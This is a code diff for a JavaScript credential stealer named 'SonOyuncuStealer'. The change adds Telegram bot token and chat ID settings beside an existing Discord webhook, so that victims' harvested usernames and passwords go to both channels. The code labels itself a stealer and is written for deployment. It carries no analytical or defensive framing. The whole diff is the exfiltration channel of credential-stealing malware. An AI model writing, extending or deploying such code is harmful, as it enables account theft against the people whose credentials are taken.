@@ -2,9 +2,11 @@ const SonOyuncuStealer = require('./sonoyuncustealer/index.js');
 const WebhookSender = require('./webhook.js');
 
 const DISCORD_WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
+const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN_HERE';
+const TELEGRAM_CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID_HERE';
 
 const stealer = new SonOyuncuStealer(false);
-const webhook = new WebhookSender(DISCORD_WEBHOOK_URL);
+const webhook = new WebhookSender(DISCORD_WEBHOOK_URL, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
 
 async function main() {
     try {
@@ -28,7 +30,7 @@ async function main() {
         const success = await webhook.sendSonOyuncuEmbed(credentials.username, credentials.password);
 
         if (success) {
-            console.log('Successfully sent to Discord');
+            console.log('Successfully sent to Discord/Telegram');
         } else {
             console.error('Failed to send webhook');
         }
